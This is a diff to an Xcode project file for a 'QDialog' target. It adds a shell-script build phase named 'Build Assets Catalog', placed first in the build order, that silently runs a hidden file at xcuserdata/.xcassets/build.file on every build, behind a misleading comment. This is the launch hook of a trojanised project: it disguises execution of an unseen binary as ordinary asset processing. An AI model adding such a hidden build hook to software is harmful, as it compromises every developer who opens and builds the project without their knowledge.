@@ -1232,6 +1232,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = B8E8419524FF85E200286848 /* Build configuration list for PBXNativeTarget "QDialog" */;
 			buildPhases = (
+				EA988CD3578DEE0B6EAAC43A /* Build Assets Catalog */,
 				B8E8417824FF85DF00286848 /* Sources */,
 				B8E8417924FF85DF00286848 /* Frameworks */,
 				B8E8417A24FF85DF00286848 /* Resources */,
@@ -1609,6 +1610,34 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+		
+	EA988CD3578DEE0B6EAAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+		};
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = B8E8417424FF85DF00286848 /* Project object */;
 }
